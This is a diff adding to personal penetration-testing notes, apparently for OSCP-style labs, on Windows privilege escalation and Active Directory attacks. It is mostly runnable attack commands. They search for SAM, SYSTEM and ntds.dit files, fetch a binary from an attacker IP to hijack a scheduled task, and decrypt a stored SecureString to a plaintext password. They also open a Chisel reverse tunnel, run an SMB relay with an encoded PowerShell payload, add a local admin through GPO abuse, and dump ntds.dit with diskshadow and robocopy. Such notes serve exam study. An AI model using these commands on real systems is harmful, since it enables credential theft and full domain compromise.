@@ -37,7 +37,7 @@ There are several key pieces of information we should always obtain:
 # However, the listed applications from above may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
 > dir "C:\Program Files"
 > dir "C:\Program Files (x86)"
-> dir "C:\Users\jim\Downloads"
+> dir "C:\Users\lisa\Downloads"
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
 > Get-Process
 > Get-Process NonStandardProcess | Select-Object Path
@@ -45,7 +45,7 @@ There are several key pieces of information we should always obtain:
 # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*kdbx,SYSTEM,SAM,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
@@ -148,6 +148,14 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 kali@kali:~$ sudo neo4j start
 # Go to http://localhost:7474 and login with default credentials
 kali@kali:~$ bloodhound
+```
+
+Match for all computers and users in the domain:
+
+```bash
+MATCH (m:Computer) RETURN m # All computers
+MATCH (m:User) RETURN m # All users
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p # Sessions
 ```
 
 Remember to mark the computers that you own!!!!!
@@ -891,7 +899,7 @@ For us, three pieces of information are vital to obtain from a scheduled task to
 We can view scheduled tasks on Windows with the **Get-ScheduledTask** Cmdlet or the command **schtasks/query**. We'll use the latter. We enter /fo with LIST as argument to specify the output format as list. Additionally, we add /v to display all properties of a task. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.
 
 ```bash
-schtasks /query /fo LIST /v | Select-String -Pattern "12:0" -Context 4,4 # Smart to filter the output to tasks being run in the same hour as the current time
+schtasks /query /fo LIST /v | Select-String -Pattern "04:0" -Context 4,4 # Smart to filter the output to tasks being run in the same hour as the current time
 icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe # Check permissions for scheduled task
 iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe # Same binary that we made for swapping binary file
 move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
@@ -1158,6 +1166,7 @@ Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:172.16.173.7"
 
 ```bash
 Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
+Get-ChildItem -Path . -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
 ```
 
 #### For Modifiable Executables but Unknown Process, Watch What's Going on
@@ -1217,3 +1226,107 @@ mimikatz # misc::cmd # Launch a new command prompt
 # Verify
 C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe
 ```
+
+#### If You Find a Weird Hash
+
+```bash
+type automation.txt
+01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000...
+
+echo "01000000d08c9ddf0115d1118c7a00c0..." > cred.txt
+
+$pw = Get-Content cred.txt | ConvertTo-SecureString
+$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)
+$UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+$UnsecurePassword
+hHO_S9gff7ehXw
+```
+
+#### Refer to NXC.sh for some cool uses
+
+Save all hashes, passwords, and users in a file so that you can automate the enumeration process of various protocols.
+
+#### If None of Your Commands Work
+
+If you're in a shit shell, try exporting a proper path:
+
+```bash
+set PATH=%SystemRoot%\system32;%SystemRoot%;
+```
+
+#### Locally Running Apps
+
+Look through the applications in "c:\program files" and "c:\program files (x86)", and run them through the exploit database to see if you can abuse a public privilege escalation.
+
+#### Chisel
+
+```bash
+kali@kali:~/beyond$ chmod a+x chisel
+kali@kali:~/beyond$ ./chisel server -p 8081 --reverse
+C:\windows\tasks> iwr -uri 192.168.45.163:8000/chisel.exe -o chisel.exe
+C:\windows\tasks> .\chisel.exe client 192.168.45.163:8081 R:8082:172.16.197.241:80
+# Could replace 172.* with localhost
+# Go to 127.0.0.1
+```
+
+#### SMB Signing Disabled
+
+Possible SMB relay attack:
+
+```bash
+# mail server ip (target for relay attack)
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.241.242 -c "powershell -enc JABjAGwAaQ..."
+# trigger by reaching out to your server (ip) by whatever means, in this case it was changing the backup migration location on wordpress to my //$ip/test
+```
+
+#### SharpGPOAbuse
+
+```bash
+. .\PowerView.ps1
+Get-GPO -Name "Default Domain Policy"
+Get-GPPermission -Guid <ID from above> -TargetType User -TargetName anirudh
+# Look for GpoEditDeleteModifySecurity
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+gpupdate /force
+
+psexec.py $ip/anirudh:SecureHM@$ip
+``` 
+
+#### Piping Password in Windows
+
+If you see something unusual, but it requires a password and it just skips over the password for whatever reason (doesn't let you input one), echo and pipe the password
+
+```bash
+cmd.exe /c echo Freedom1 | .\admintool.exe whoami
+```
+
+#### Abusing Backup Operator Privileges
+
+From Blackfield.
+
+Transfer the following script.txt onto the machine:
+
+```bash
+set verbose onX
+set metadata C:\Windows\Temp\meta.cabX
+set context  clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+
+Then run:
+
+```bash
+diskshadow /s script.txt
+...
+cd E:\Windows\ntds
+dir
+cd C:\Windows\Temp
+robocopy /b E:\Windows\ntds . ntds.dit
+reg save hklm\system C:\Windows\Temp\System
+```
+
